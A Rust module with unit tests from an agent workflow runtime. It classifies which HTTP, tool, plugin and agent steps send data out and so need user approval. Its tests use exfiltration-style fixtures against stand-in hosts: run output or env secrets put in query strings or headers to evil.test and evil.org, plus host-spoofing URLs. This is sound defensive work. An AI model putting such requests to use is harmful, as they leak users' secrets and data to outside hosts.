//! Which steps send data out, so they must sit behind an approval.
//!
//! - `http-request`: any method other than GET / HEAD / OPTIONS (read the way
//!   graphrt-http reads it: trimmed, any case), a body that is not `none`, and a
//!   request of ANY method whose URL, query, headers, authorization or body reads
//!   a value (`{{#…#}}`: inputs, earlier steps, `env` secrets). The draft picks the
//!   address, so a GET can carry data to any host as easily as a POST.
//!   One exception, a *trusted lookup* ([`check_http_request`]): a GET / HEAD
//!   without a body whose scheme and host are written out literally and match one
//!   of the agent's trusted hosts ([`super::trusted_hosts`]) reads, whatever values
//!   its path, query, headers or authorization carry, as long as `env` secrets
//!   appear only in the query, headers or authorization (never in the path).
//! - plugin steps (`plugin.operation`): see [`crate::plugins::is_sending_plugin_kind`].
//! - `tool` steps: the tool's operation name, classified like a plugin operation
//!   (conservative: unknown names send). Tools of the `agents` provider run
//!   another agent, whose own sending steps stop at its approvals (a nested run
//!   that pauses fails), so they do not send by themselves.
//! - `agent` steps: any tool that sends and is not covered by the step's own
//!   `require_approval` (graphrt pauses before each such call).
//! - in a whole graph, also any step that reaches outside (HTTP, `tool`, plugin,
//!   `agent` with tools) and reads output that a local CLI which may have run a
//!   command produced (Codex), directly or through other steps: see
//!   [`unvetted_output_node_ids`].

use std::collections::HashSet;

use graphrt_core::Graph;
use serde_json::{Map, Value as Json};

use super::trusted_hosts::{literal_origin, TrustedHosts};
use crate::agent_steps::AGENT_TOOL_PROVIDER;

/// Methods that only read (graphrt-http accepts these and POST / PUT / PATCH / DELETE).
const READING_METHODS: &[&str] = &["GET", "HEAD", "OPTIONS"];
/// Methods a trusted lookup may use (OPTIONS carrying values is not a lookup).
const LOOKUP_METHODS: &[&str] = &["GET", "HEAD"];
const ENV_NAMESPACE: &str = "env.";
/// HTTP fields that become part of the request.
const HTTP_REQUEST_FIELDS: &[&str] = &["url", "params", "headers", "authorization", "body"];
const REFERENCE_OPENING: &str = "{{#";
/// `require_approval` entry that covers every tool.
const ALL_TOOLS: &str = "*";

/// Whether a node kind with this config sends data out (`trusted` are the agent's trusted lookup hosts).
pub(super) fn is_sending_kind(kind: &str, config: &Map<String, Json>, trusted: &TrustedHosts) -> bool {
    match kind {
        "http-request" => !check_http_request(config, trusted).runs_without_asking(),
        "tool" => tool_node_sends(config),
        "agent" => !agent_unapproved_sending_tools(config).is_empty(),
        _ => crate::plugins::is_sending_plugin_kind(kind),
    }
}

/// Ids of the steps whose output may carry what a local CLI that might have run a
/// command produced (`local_cli::capability::output_needs_send_approval`, Codex):
/// model steps backed by such a provider, and every step that reads (`{{#id.…#}}`
/// or a `[id, output]` selector) from one of them, transitively.
pub(super) fn unvetted_output_node_ids(graph: &Graph) -> HashSet<String> {
    let mut unvetted: HashSet<String> = graph
        .nodes()
        .iter()
        .filter(|node| crate::local_cli::capability::output_needs_send_approval(&node.doc.config))
        .map(|node| node.id.to_string())
        .collect();
    loop {
        let newly_unvetted: Vec<String> = graph
            .nodes()
            .iter()
            .filter(|node| !unvetted.contains(&*node.id) && reads_from_any(&node.doc.config, &unvetted))
            .map(|node| node.id.to_string())
            .collect();
        if newly_unvetted.is_empty() {
            return unvetted;
        }
        unvetted.extend(newly_unvetted);
    }
}

/// Whether a step that can reach outside the app (HTTP, `tool`, plugin, `agent`
/// with tools) reads one of `unvetted` steps' output: it then needs an approval
/// even when its own kind only reads (a search query can carry data too).
pub(super) fn passes_on_unvetted_output(kind: &str, config: &Map<String, Json>, unvetted: &HashSet<String>) -> bool {
    let reaches_outside = match kind {
        "http-request" | "tool" => true,
        "agent" => config.get("tools").and_then(Json::as_array).is_some_and(|tools| !tools.is_empty()),
        _ => kind.contains('.'),
    };
    reaches_outside && reads_from_any(config, unvetted)
}

/// True when any `{{#id.…#}}` reference or `[id, output, …]` selector in `value` names one of `node_ids`.
fn reads_from_any(config: &Map<String, Json>, node_ids: &HashSet<String>) -> bool {
    !node_ids.is_empty() && config.values().any(|value| value_reads_from_any(value, node_ids))
}

fn value_reads_from_any(value: &Json, node_ids: &HashSet<String>) -> bool {
    match value {
        Json::String(text) => referenced_node_ids(text).any(|node_id| node_ids.contains(node_id)),
        Json::Array(items) => {
            let is_selector = items.len() >= 2 && items.iter().all(Json::is_string);
            let selector_hit = is_selector && items[0].as_str().is_some_and(|node_id| node_ids.contains(node_id));
            selector_hit || items.iter().any(|item| value_reads_from_any(item, node_ids))
        }
        Json::Object(fields) => fields.values().any(|field| value_reads_from_any(field, node_ids)),
        _ => false,
    }
}

/// The node ids of the `{{#node.field#}}` references in `text`.
pub(super) fn referenced_node_ids(text: &str) -> impl Iterator<Item = &str> {
    text.split(REFERENCE_OPENING).skip(1).filter_map(|rest| {
        let selector = rest.split("#}}").next()?;
        selector.split('.').next().map(str::trim).filter(|node_id| !node_id.is_empty())
    })
}

/// `provider/name` of the tools of an `agent` config that send without the step asking first.
pub(super) fn agent_unapproved_sending_tools(config: &Map<String, Json>) -> Vec<String> {
    unapproved_sending_tools_with(config, &crate::mcp::current())
}

/// [`agent_unapproved_sending_tools`] with the MCP servers `mcp_servers`.
///
/// `<server>/*` of an MCP server whose tools are known (from its last
/// connection test) stands for each of those tools, so `require_approval` can
/// list only the ones that send. Without known tools it stays one tool that sends.
pub(crate) fn unapproved_sending_tools_with(
    config: &Map<String, Json>,
    mcp_servers: &[crate::mcp::McpServerDefinition],
) -> Vec<String> {
    let approvals = approval_entries(config);
    read_tool_references(config)
        .into_iter()
        .flat_map(|tool| expand_mcp_wildcard(tool, mcp_servers))
        .filter(|tool| tool_sends_with(&tool.provider, &tool.name, mcp_servers))
        .filter(|tool| !tool.is_covered_by(&approvals))
        .map(|tool| format!("{}/{}", tool.provider, tool.name))
        .collect()
}

/// Why an `http-request` step does or does not need an approval.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HttpRequestCheck {
    /// A GET / HEAD / OPTIONS that carries nothing from the run: reads.
    PlainRead,
    /// A GET / HEAD to a trusted host: reads, runs without asking.
    TrustedLookup { host: String },
    /// A method that changes data (POST, PUT, PATCH, DELETE...) or OPTIONS carrying values.
    ChangesData { method: String },
    /// A request with a body.
    SendsBody,
    /// The scheme or host comes from a value, so the run could pick any address.
    AddressFromValues,
    /// A secret (`env`) value in the address path, where servers and proxies log it.
    SecretInPath { host: String },
    /// A lookup to a fixed host the agent does not trust yet: trusting `host` makes it read.
    UntrustedHost { host: String },
}

impl HttpRequestCheck {
    /// The request reads, so no approval is needed before it.
    pub fn runs_without_asking(&self) -> bool {
        matches!(self, Self::PlainRead | Self::TrustedLookup { .. })
    }

    /// The host to offer "Trust <host> for lookups" for, when trusting it would make the request read.
    pub fn trustable_host(&self) -> Option<&str> {
        match self {
            Self::UntrustedHost { host } => Some(host),
            _ => None,
        }
    }

    /// One plain sentence for the inspector: whether the request asks first, and why.
    pub fn explanation(&self) -> String {
        match self {
            Self::PlainRead => "Runs without asking: it only reads and sends nothing from the run".into(),
            Self::TrustedLookup { host } => {
                format!("Runs without asking: a read-only lookup on {host}, which you trust for lookups")
            }
            Self::ChangesData { method } => format!("Asks you first: a {method} request can change data"),
            Self::SendsBody => "Asks you first: it sends a body".into(),
            Self::AddressFromValues => {
                "Asks you first: its address is built from values, so it could go to any site".into()
            }
            Self::SecretInPath { host } => {
                format!("Asks you first: it puts a secret in the address path on {host}; send keys in a header or query parameter")
            }
            Self::UntrustedHost { host } => {
                format!("Asks you first: it sends values to {host}, which you have not trusted for lookups")
            }
        }
    }
}

/// Classifies an `http-request` config (see the module docs).
pub fn check_http_request(config: &Map<String, Json>, trusted: &TrustedHosts) -> HttpRequestCheck {
    let method = config.get("method").and_then(Json::as_str).unwrap_or("GET").trim().to_ascii_uppercase();
    if !READING_METHODS.contains(&method.as_str()) {
        return HttpRequestCheck::ChangesData { method };
    }
    if has_request_body(config) {
        return HttpRequestCheck::SendsBody;
    }
    if !HTTP_REQUEST_FIELDS.iter().filter_map(|field| config.get(*field)).any(contains_reference) {
        return HttpRequestCheck::PlainRead;
    }
    if !LOOKUP_METHODS.contains(&method.as_str()) {
        return HttpRequestCheck::ChangesData { method };
    }
    let url = config.get("url").and_then(Json::as_str).unwrap_or_default();
    let Some(origin) = literal_origin(url) else { return HttpRequestCheck::AddressFromValues };
    let host = origin.display();
    if secret_in_url_path(url) {
        return HttpRequestCheck::SecretInPath { host };
    }
    if trusted.allows(&origin.host, origin.port) {
        HttpRequestCheck::TrustedLookup { host }
    } else {
        HttpRequestCheck::UntrustedHost { host }
    }
}

/// True when an `env` value is read in the URL before its query: a secret in the
/// path ends up in server and proxy logs. (A body is refused before this, and
/// `params`, `headers` and `authorization` may carry an API key to a trusted host.)
fn secret_in_url_path(url: &str) -> bool {
    let path_part = url.split_once('?').map_or(url, |(before_query, _)| before_query);
    reads_env(path_part)
}

fn reads_env(text: &str) -> bool {
    text.split(REFERENCE_OPENING)
        .skip(1)
        .filter_map(|rest| rest.split("#}}").next())
        .any(|selector| selector.trim_start().starts_with(ENV_NAMESPACE))
}

fn has_request_body(config: &Map<String, Json>) -> bool {
    match config.get("body") {
        None | Some(Json::Null) => false,
        Some(Json::Object(body)) => {
            let body_type = body.get("type").and_then(Json::as_str).map_or("none", str::trim);
            !body_type.eq_ignore_ascii_case("none")
        }
        Some(_) => true,
    }
}

/// True when any string inside `value` holds a `{{#…#}}` reference.
fn contains_reference(value: &Json) -> bool {
    match value {
        Json::String(text) => text.contains(REFERENCE_OPENING),
        Json::Array(items) => items.iter().any(contains_reference),
        Json::Object(fields) => fields.values().any(contains_reference),
        _ => false,
    }
}

fn tool_node_sends(config: &Map<String, Json>) -> bool {
    let provider = ["provider_id", "provider", "provider_name"]
        .iter()
        .find_map(|field| config.get(*field).and_then(Json::as_str))
        .unwrap_or_default();
    let tool_name = config.get("tool_name").and_then(Json::as_str).unwrap_or_default();
    tool_sends(provider, tool_name)
}

fn tool_sends(provider: &str, tool_name: &str) -> bool {
    tool_sends_with(provider, tool_name, &crate::mcp::current())
}

fn tool_sends_with(provider: &str, tool_name: &str, mcp_servers: &[crate::mcp::McpServerDefinition]) -> bool {
    if provider.trim() == AGENT_TOOL_PROVIDER {
        return false;
    }
    // The file, document and image tools only touch the agent's own workspace
    // (`crate::agent_files`): nothing leaves the computer and `delete` is never offered.
    if crate::agent_files::abilities::is_file_tool_provider(provider) {
        return false;
    }
    // An MCP server's own approval policy (a plugin's rule, tools the user relaxed).
    if let Some(sends) = crate::mcp::tool_sends_in(mcp_servers, provider, tool_name) {
        return sends;
    }
    tool_name.trim() == ALL_TOOLS || crate::plugins::is_sending_operation(tool_name)
}

/// `<server>/*` of an MCP server with known tools becomes one reference per tool.
fn expand_mcp_wildcard(tool: ToolReference, mcp_servers: &[crate::mcp::McpServerDefinition]) -> Vec<ToolReference> {
    if tool.name != ALL_TOOLS {
        return vec![tool];
    }
    let server_name = tool.provider.strip_prefix(crate::mcp::PROVIDER_PREFIX).unwrap_or(&tool.provider);
    match mcp_servers.iter().find(|server| server.name == server_name) {
        Some(server) if !server.known_tools.is_empty() => server
            .known_tools
            .iter()
            .map(|known| ToolReference { provider: tool.provider.clone(), name: known.name.clone() })
            .collect(),
        _ => vec![tool],
    }
}

/// A tool an `agent` step lists in `tools`.
struct ToolReference {
    provider: String,
    name: String,
}

impl ToolReference {
    /// Mirrors graphrt's agent node: `*`, the tool name, `provider/name` or the
    /// name offered to the model. A `provider/*` entry is covered only by `*`.
    fn is_covered_by(&self, approvals: &[String]) -> bool {
        approvals.iter().any(|entry| {
            entry == ALL_TOOLS
                || (self.name != ALL_TOOLS
                    && (*entry == self.name
                        || *entry == format!("{}/{}", self.provider, self.name)
                        || *entry == model_safe_name(&self.name)))
        })
    }
}

/// `require_approval: ["provider/name", ...]` (a single string is read as one entry).
fn approval_entries(config: &Map<String, Json>) -> Vec<String> {
    match config.get("require_approval") {
        Some(Json::Array(entries)) => {
            entries.iter().filter_map(Json::as_str).map(|entry| entry.trim().to_owned()).collect()
        }
        Some(Json::String(entry)) => vec![entry.trim().to_owned()],
        _ => Vec::new(),
    }
}

/// `tools: ["provider/name", {provider, name}]`; an entry it cannot read counts
/// as an unknown tool of an unknown provider (so it sends).
fn read_tool_references(config: &Map<String, Json>) -> Vec<ToolReference> {
    let Some(tools) = config.get("tools").and_then(Json::as_array) else { return Vec::new() };
    tools
        .iter()
        .map(|entry| {
            let (provider, name) = match entry {
                Json::String(reference) => reference.split_once('/').unwrap_or(("", reference.as_str())),
                Json::Object(fields) => (
                    fields.get("provider").and_then(Json::as_str).unwrap_or_default(),
                    fields.get("name").or_else(|| fields.get("tool")).and_then(Json::as_str).unwrap_or_default(),
                ),
                _ => ("", ""),
            };
            ToolReference { provider: provider.trim().to_owned(), name: name.trim().to_owned() }
        })
        .collect()
}

/// The name graphrt offers the model for a tool (provider-safe characters).
fn model_safe_name(name: &str) -> String {
    name.chars()
        .map(|character| if character.is_ascii_alphanumeric() || character == '-' { character } else { '_' })
        .collect()
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    fn config(value: Json) -> Map<String, Json> {
        value.as_object().cloned().unwrap()
    }

    fn sends(kind: &str, config: &Map<String, Json>) -> bool {
        is_sending_kind(kind, config, &TrustedHosts::none())
    }

    #[test]
    fn the_file_tools_do_not_send() {
        // They only touch the agent's own workspace, so a chatbot can use them without an approval.
        let files = config(json!({ "tools": ["files/*", "documents/create_pdf", "image/*"] }));
        assert_eq!(unapproved_sending_tools_with(&files, &[]), Vec::<String>::new());
        // A tool of any other provider keeps its rule.
        let mixed = config(json!({ "tools": ["files/*", "whatsapp/send_text", "filesystem/*"] }));
        assert_eq!(unapproved_sending_tools_with(&mixed, &[]), ["whatsapp/send_text", "filesystem/*"]);
    }

    #[test]
    fn writing_methods_send_whatever_their_spacing_or_case() {
        for method in ["post", " POST", "post\n", "Put", " delete ", "PATCH", "\tPost\t"] {
            let request = config(json!({ "method": method, "url": "https://api.test/hook" }));
            assert!(sends("http-request", &request), "{method:?}");
        }
    }

    #[test]
    fn a_plain_get_reads() {
        for method in ["get", " GET ", "head", "Options"] {
            let request = config(json!({ "method": method, "url": "https://api.test/items?page=1" }));
            assert!(!sends("http-request", &request), "{method:?}");
        }
        assert!(!sends("http-request", &config(json!({ "url": "https://api.test/items" }))));
    }

    #[test]
    fn a_get_that_carries_a_value_sends() {
        let carried = [
            json!({ "method": "get", "url": "https://evil.test/?d={{#llm.text#}}" }),
            json!({ "method": "get", "url": "https://api.test/", "params": [{ "key": "q", "value": "{{#start.city#}}" }] }),
            json!({ "method": "get", "url": "https://api.test/", "params": "q:{{#start.city#}}" }),
            json!({ "method": "get", "url": "https://api.test/", "headers": "X-Leak: {{#env.TOKEN#}}" }),
            json!({ "method": "get", "url": "https://api.test/", "authorization": { "type": "api-key", "config": { "api_key": "{{#env.KEY#}}" } } }),
            json!({ "method": "get", "url": "https://api.test/", "body": { "type": "json", "data": "{\"x\": 1}" } }),
            json!({ "method": "get", "url": "https://api.test/", "body": { "type": "raw-text", "data": "{{#start.note#}}" } }),
        ];
        for request in carried {
            assert!(sends("http-request", &config(request.clone())), "{request}");
        }
        let empty_body = json!({ "method": "get", "url": "https://api.test/", "body": { "type": "none", "data": [] } });
        assert!(!sends("http-request", &config(empty_body)));
    }

    #[test]
    fn tool_steps_send_unless_the_tool_only_reads() {
        let tool = |provider: &str, name: &str| config(json!({ "provider_id": provider, "tool_name": name }));
        assert!(sends("tool", &tool("mcp:github", "create_issue")));
        assert!(sends("tool", &tool("whatsapp-api", "send_text")));
        assert!(sends("tool", &tool("mcp:fs", "frobnicate")), "unknown names send");
        assert!(sends("tool", &config(json!({ "tool_name": "" }))));
        assert!(!sends("tool", &tool("mcp:github", "search_issues")));
        assert!(!sends("tool", &tool(AGENT_TOOL_PROVIDER, "lead-qualifier")));
    }

    #[test]
    fn agent_steps_with_sending_tools_send_unless_each_asks_first() {
        let agent = |value: Json| config(value);
        let unasked = agent(json!({ "tools": ["whatsapp-api/send_text", "mcp:maps/search_places"] }));
        assert!(sends("agent", &unasked));
        assert_eq!(agent_unapproved_sending_tools(&unasked), ["whatsapp-api/send_text"]);

        let every_send_asks = agent(json!({
            "tools": ["whatsapp-api/send_text", { "provider": "gmail-api", "name": "send_email" }, "mcp:maps/search_places"],
            "require_approval": ["whatsapp-api/send_text", "send_email"]
        }));
        assert!(!sends("agent", &every_send_asks));

        let one_send_unasked = agent(json!({
            "tools": ["whatsapp-api/send_text", "gmail-api/send_email"],
            "require_approval": ["send_text"]
        }));
        assert_eq!(agent_unapproved_sending_tools(&one_send_unasked), ["gmail-api/send_email"]);

        let wildcard = agent(json!({ "tools": ["mcp:github/*"], "require_approval": ["mcp:github/*"] }));
        assert!(sends("agent", &wildcard), "only `*` covers a whole provider");
        let all_ask = agent(json!({ "tools": ["mcp:github/*"], "require_approval": ["*"] }));
        assert!(!sends("agent", &all_ask));

        assert!(!sends("agent", &agent(json!({ "tools": ["mcp:maps/search_places"] }))));
        assert!(!sends("agent", &agent(json!({}))));
        assert!(!sends("agent", &agent(json!({ "tools": ["agents/lead-qualifier"] }))));
    }

    fn weather_hosts() -> TrustedHosts {
        TrustedHosts::from_entries(["api.weather.com", "*.maps.org"])
    }

    fn check(request: Json) -> HttpRequestCheck {
        check_http_request(&config(request), &weather_hosts())
    }

    #[test]
    fn lookups_on_trusted_hosts_read_whatever_values_they_carry() {
        let lookups = [
            json!({ "method": "get", "url": "https://api.weather.com/v1?city={{#start.city#}}" }),
            json!({ "method": " GET ", "url": "https://API.weather.com/v1/{{#start.city#}}" }),
            json!({ "method": "Head", "url": "https://api.weather.com/v1", "params": [{ "key": "q", "value": "{{#llm.text#}}" }] }),
            json!({ "url": "https://eu.maps.org/search", "params": "q:{{#start.place#}}" }),
            json!({ "method": "get", "url": "https://a.b.maps.org/search?q={{#start.place#}}", "body": { "type": "none" } }),
        ];
        for request in lookups {
            assert!(
                matches!(check(request.clone()), HttpRequestCheck::TrustedLookup { .. }),
                "{request}: {:?}",
                check(request.clone())
            );
            assert!(!is_sending_kind("http-request", &config(request.clone()), &weather_hosts()), "{request}");
        }
    }

    #[test]
    fn trusted_hosts_never_cover_writes_or_bodies() {
        for method in ["post", "PUT", " patch ", "delete", "options"] {
            let request = json!({ "method": method, "url": "https://api.weather.com/v1?q={{#start.city#}}" });
            assert!(matches!(check(request), HttpRequestCheck::ChangesData { .. }), "{method:?}");
        }
        let with_body =
            json!({ "method": "get", "url": "https://api.weather.com/v1", "body": { "type": "json", "data": "{}" } });
        assert_eq!(check(with_body), HttpRequestCheck::SendsBody);
        let raw_body = json!({ "method": "get", "url": "https://api.weather.com/v1", "body": "{{#start.note#}}" });
        assert_eq!(check(raw_body), HttpRequestCheck::SendsBody);
    }

    #[test]
    fn a_templated_scheme_or_host_is_never_trusted() {
        for url in [
            "{{#env.WEATHER_URL#}}/v1?q={{#start.city#}}",
            "https://{{#start.host#}}/v1",
            "https://api.weather.com{{#start.suffix#}}/v1",
            "https://api.weather.com.{{#start.domain#}}/v1",
            "{{#start.scheme#}}://api.weather.com/v1",
            "https://evil.org\\@api.weather.com/v1?q={{#start.city#}}",
        ] {
            let request = json!({ "method": "get", "url": url });
            assert_eq!(check(request), HttpRequestCheck::AddressFromValues, "{url}");
        }
    }

    #[test]
    fn hosts_outside_the_list_need_trusting() {
        let untrusted = [
            ("https://evil.org/?d={{#llm.text#}}", "evil.org"),
            ("https://weather.com/v1?q={{#start.city#}}", "weather.com"),
            ("https://api.weather.com.evil.org/v1?q={{#start.city#}}", "api.weather.com.evil.org"),
            ("https://maps.org/search?q={{#start.place#}}", "maps.org"),
            ("https://api.weather.com:8443/v1?q={{#start.city#}}", "api.weather.com:8443"),
        ];
        for (url, host) in untrusted {
            let result = check(json!({ "method": "get", "url": url }));
            assert_eq!(result.trustable_host(), Some(host), "{url}");
            assert!(!result.runs_without_asking());
        }
        let nothing_trusted = check_http_request(
            &config(json!({ "url": "https://api.weather.com/v1?q={{#start.city#}}" })),
            &TrustedHosts::none(),
        );
        assert_eq!(nothing_trusted.trustable_host(), Some("api.weather.com"));
    }

    #[test]
    fn secrets_go_to_trusted_hosts_only_in_headers_query_or_authorization() {
        let key_places = [
            json!({ "url": "https://api.weather.com/v1?appid={{#env.WEATHER_KEY#}}&q={{#start.city#}}" }),
            json!({ "url": "https://api.weather.com/v1", "params": [{ "key": "appid", "value": "{{#env.WEATHER_KEY#}}" }] }),
            json!({ "url": "https://api.weather.com/v1", "headers": "X-Api-Key: {{#env.WEATHER_KEY#}}" }),
            json!({ "url": "https://api.weather.com/v1", "authorization": { "type": "api-key", "config": { "api_key": "{{#env.WEATHER_KEY#}}" } } }),
        ];
        for request in key_places {
            assert!(matches!(check(request.clone()), HttpRequestCheck::TrustedLookup { .. }), "{request}");
        }
        let in_path = json!({ "url": "https://api.weather.com/{{#env.WEATHER_KEY#}}/v1?q={{#start.city#}}" });
        assert!(matches!(check(in_path), HttpRequestCheck::SecretInPath { .. }));
        let to_untrusted = json!({ "url": "https://evil.org/v1", "headers": "X-Api-Key: {{#env.WEATHER_KEY#}}" });
        assert_eq!(check(to_untrusted).trustable_host(), Some("evil.org"));
        let host_from_secret = json!({ "url": "https://{{#env.WEATHER_HOST#}}/v1" });
        assert_eq!(check(host_from_secret), HttpRequestCheck::AddressFromValues);
    }

    #[test]
    fn plain_reads_stay_reads_without_any_trusted_host() {
        let plain = json!({ "method": "options", "url": "https://anything.org/items?page=1" });
        assert_eq!(check_http_request(&config(plain), &TrustedHosts::none()), HttpRequestCheck::PlainRead);
    }

    #[test]
    fn every_check_explains_itself() {
        let checks = [
            HttpRequestCheck::PlainRead,
            HttpRequestCheck::TrustedLookup { host: "api.weather.com".into() },
            HttpRequestCheck::ChangesData { method: "POST".into() },
            HttpRequestCheck::SendsBody,
            HttpRequestCheck::AddressFromValues,
            HttpRequestCheck::SecretInPath { host: "api.weather.com".into() },
            HttpRequestCheck::UntrustedHost { host: "evil.org".into() },
        ];
        for check in checks {
            let explanation = check.explanation();
            let expected_start = if check.runs_without_asking() { "Runs without asking" } else { "Asks you first" };
            assert!(explanation.starts_with(expected_start), "{explanation}");
        }
    }

    fn upwork_server(known_tools: &[&str]) -> crate::mcp::McpServerDefinition {
        let server = crate::plugins::host::PluginMcpServer {
            spec: serde_json::from_value(json!({
                "url": "https://mcp.upwork.com/mcp", "auth": "oauth",
                "approval": {"default": "ask", "read_only": ["find_*", "get_*", "list_*", "search_*"]}
            }))
            .unwrap(),
            guide: None,
        };
        let mut definition = crate::mcp::plugin_servers::definition_for("upwork", &server).unwrap();
        definition.known_tools = known_tools
            .iter()
            .map(|name| crate::mcp::McpToolInfo {
                name: (*name).into(),
                description: String::new(),
                input_schema: None,
            })
            .collect();
        definition
    }

    #[test]
    fn a_server_wildcard_stands_for_its_known_tools() {
        let servers = [upwork_server(&["list_accounts", "find_jobs", "confirm_preview", "send_message"])];
        let approved = config(json!({
            "tools": ["upwork/*"],
            "require_approval": ["upwork/confirm_preview", "upwork/send_message"]
        }));
        assert!(unapproved_sending_tools_with(&approved, &servers).is_empty(), "every write tool is approved");
        let missing = config(json!({ "tools": ["upwork/*"], "require_approval": ["upwork/confirm_preview"] }));
        assert_eq!(unapproved_sending_tools_with(&missing, &servers), ["upwork/send_message"]);
        let explicit = config(json!({ "tools": ["upwork/find_jobs", "upwork/list_accounts"] }));
        assert!(unapproved_sending_tools_with(&explicit, &servers).is_empty(), "reading tools run on their own");
        let alias = config(json!({ "tools": ["mcp:upwork/*"], "require_approval": ["*"] }));
        assert!(unapproved_sending_tools_with(&alias, &servers).is_empty());
    }

    #[test]
    fn a_server_wildcard_without_known_tools_still_sends() {
        let servers = [upwork_server(&[])];
        let wildcard = config(json!({ "tools": ["upwork/*"], "require_approval": ["upwork/confirm_preview"] }));
        assert_eq!(unapproved_sending_tools_with(&wildcard, &servers), ["upwork/*"]);
    }
}
